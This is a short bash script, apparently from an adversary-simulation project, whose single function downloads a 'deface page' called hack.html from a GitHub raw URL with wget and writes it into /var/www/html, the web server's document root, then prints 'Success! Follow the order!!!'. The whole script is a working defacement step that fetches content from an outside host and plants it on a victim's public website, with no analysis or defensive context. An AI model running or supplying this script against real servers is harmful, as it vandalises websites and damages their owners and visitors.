#!/bin/bash

execute() {
    echo "Downloading deface page"
    wget -O /var/www/html/hack.html https://raw.githubusercontent.com/fareedfauzi/Adv_Sim/main/hack.html
    echo "Success! Follow the order!!!"
}
execute
